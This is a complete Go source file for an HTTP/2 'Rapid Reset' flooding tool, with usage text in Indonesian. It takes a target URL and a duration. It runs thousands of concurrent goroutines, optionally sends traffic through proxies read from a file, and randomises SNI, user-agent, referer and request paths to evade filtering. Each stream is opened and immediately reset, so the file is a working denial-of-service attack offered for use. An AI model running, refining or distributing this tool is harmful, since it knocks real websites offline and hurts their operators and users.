package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	wrk               = 1500
	sub               = 5
	Dialer_Timeout    = 3 * time.Second
	Handsake_Timeout  = 5 * time.Second
	Max_Streams       = 100
	Reset_After       = 10
)

var sniList = []string{
	"google.com",
	"yahoo.com",
	"duckduckgo.com",
}

var pathList = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
	"/search", "/category/", "/tag/", "/feed/", "/comment/",
	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
	"/login", "/register", "/forgot-password", "/reset-password",
	"/product", "/products", "/category/products", "/shop",
	"/cart", "/checkout", "/payment", "/success", "/cancel",
	"/blog", "/post", "/article", "/news", "/event",
	"/contact", "/about", "/team", "/career", "/faq",
	"/search?q=", "/api/search", "/api/filter", "/api/query", "/graphql",
	"/api/v1/data", "/api/v2/query", "/api/v3/filter", "/api/v4/load",
	"/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
	"/index.php", "/home", "/main", "/portal", "/gateway",
}

var uaList = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
}

var acceptList = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"*/*",
}

var langList = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"id,en;q=0.9",
}

var refererList = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://duckduckgo.com/",
}

func RandominSni() string {
	return sniList[rand.Intn(len(sniList))]
}

func Path_Random() string {
	return pathList[rand.Intn(len(pathList))]
}

func User_Agent_Random() string {
	return uaList[rand.Intn(len(uaList))]
}

func Tls_Confignya() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         RandominSni(),
		MinVersion:         tls.VersionTLS13,
		MaxVersion:         tls.VersionTLS13,
		NextProtos:         []string{"h2"},
	}
}

func Proxy_Dialer(Proxy_Convert *url.URL, Cari_Target_Link string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", Proxy_Convert.Host, Dialer_Timeout)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", Cari_Target_Link, Cari_Target_Link)
	_, err = conn.Write([]byte(req))
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp := make([]byte, 1024)
	n, err := conn.Read(resp)
	if err != nil || n == 0 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed")
	}
	if !strings.Contains(string(resp[:n]), "200 Connection established") {
		conn.Close()
		return nil, fmt.Errorf("proxy returned non-200: %s", string(resp[:n]))
	}
	return conn, nil
}

func Kirim_Reqnya_H2(framer *http2.Framer, host, path string, streamID uint32) error {
	ua := User_Agent_Random()
	accept := acceptList[rand.Intn(len(acceptList))]
	lang := langList[rand.Intn(len(langList))]
	ref := refererList[rand.Intn(len(refererList))]

	var buf bytes.Buffer
	enc := hpack.NewEncoder(&buf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: ua})
	enc.WriteField(hpack.HeaderField{Name: "accept", Value: accept})
	enc.WriteField(hpack.HeaderField{Name: "accept-language", Value: lang})
	enc.WriteField(hpack.HeaderField{Name: "referer", Value: ref})
	enc.WriteField(hpack.HeaderField{Name: "connection", Value: "keep-alive"})

	err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: buf.Bytes(),
		EndHeaders:    true,
		EndStream:     false,
	})
	if err != nil {
		return err
	}

	err = framer.WriteData(streamID, true, nil)
	if err != nil {
		return err
	}

	return framer.WriteRSTStream(streamID, http2.ErrCodeNo)
}

func Tls_Send(conn net.Conn, host string, ctx context.Context) error {
	cfg := Tls_Confignya()
	tlsConn := tls.Client(conn, cfg)

	handCtx, cancel := context.WithTimeout(context.Background(), Handsake_Timeout)
	defer cancel()
	errCh := make(chan error, 1)
	go func() {
		errCh <- tlsConn.Handshake()
	}()
	var err error
	select {
	case err = <-errCh:
	case <-handCtx.Done():
		tlsConn.Close()
		return handCtx.Err()
	}
	if err != nil {
		tlsConn.Close()
		return err
	}

	framer := http2.NewFramer(tlsConn, tlsConn)
	_, err = tlsConn.Write([]byte(http2.ClientPreface))
	if err != nil {
		tlsConn.Close()
		return err
	}
	err = framer.WriteSettings()
	if err != nil {
		tlsConn.Close()
		return err
	}
	go func() {
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			if _, ok := f.(*http2.SettingsFrame); ok {
				return
			}
		}
	}()

	var wg sync.WaitGroup
	streamID := uint32(1)
	reqCount := 0
	var mu sync.Mutex

	for {
		select {
		case <-ctx.Done():
			tlsConn.Close()
			return ctx.Err()
		default:
		}
		mu.Lock()
		if reqCount >= Reset_After {
			mu.Unlock()
			break
		}
		reqCount++
		mu.Unlock()

		path := Path_Random()
		wg.Add(1)
		go func(id uint32) {
			defer wg.Done()
			_ = Kirim_Reqnya_H2(framer, host, path, id)
		}(streamID)
		streamID += 2

		if streamID > uint32(Max_Streams*2) {
			wg.Wait()
			streamID = 1
			reqCount = 0
		}
	}
	wg.Wait()
	tlsConn.Close()
	return nil
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 2 {
		fmt.Println("cara make nya : tls-flood <target> [duration]")
		fmt.Println("Detail : tls-flood https://jembotmu.com 60")
		os.Exit(1)
	}
	target := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}

	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	port := parsed.Port()
	if port == "" {
		port = "443"
	}
	Cari_Target_Link := host + ":" + port

	var Proxy_File []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				Proxy_File = append(Proxy_File, p)
			}
		}
	}
	if len(Proxy_File) == 0 {
		Proxy_File = append(Proxy_File, nil)
	}

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Method : TLS+HTTP/2 Rapid Reset Flood\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	fmt.Printf("ޗ | Target : %s\n", target)
	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(Proxy_File))
	fmt.Printf("ޗ | Conc   : %d\n", wrk)
	fmt.Printf("ޗ | Sub    : %d\n", sub)
	fmt.Printf("ޗ | Reset  : Setelah %d request\n", Reset_After)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		proxy := Proxy_File[i%len(Proxy_File)]
		go func(Proxy_Convert *url.URL) {
			defer wg.Done()
			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func() {
					defer swg.Done()
					for ctx.Err() == nil {
						var conn net.Conn
						var err error
						if Proxy_Convert == nil {
							conn, err = net.DialTimeout("tcp", Cari_Target_Link, Dialer_Timeout)
						} else {
							conn, err = Proxy_Dialer(Proxy_Convert, Cari_Target_Link)
						}
						if err != nil {
							continue
						}
						_ = Tls_Send(conn, host, ctx)
					}
				}()
			}
			swg.Wait()
		}(proxy)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
